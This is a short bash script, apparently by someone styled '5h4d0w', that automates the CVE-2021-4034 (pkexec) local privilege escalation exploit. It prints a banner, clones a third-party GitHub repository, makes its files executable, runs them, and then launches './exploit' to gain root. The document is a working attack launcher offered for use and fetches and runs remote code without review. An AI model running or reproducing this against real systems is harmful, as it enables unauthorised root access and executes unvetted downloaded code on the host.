#!/usr/bin/bash

echo "============================================"
echo "Hey 5h4d0w Here..."  
echo "CVE-2021-4034"
echo "pxexec Local Privilege Escalation exploit"
echo "============================================"
echo ""
echo "Processing ..."
echo ""
echo "Downloading the Script..."
git clone "https://github.com/ryaagard/CVE-2021-4034.git"
cd CVE-2021-4034
chmod +x *
./Makefile
sleep 2
clear 
echo ""
echo "============================================"
echo "Hey 5h4d0w Here..."  
echo "CVE-2021-4034"
echo "pxexec Local Privilege Escalation exploit"
echo "============================================"
echo ""
./exploit

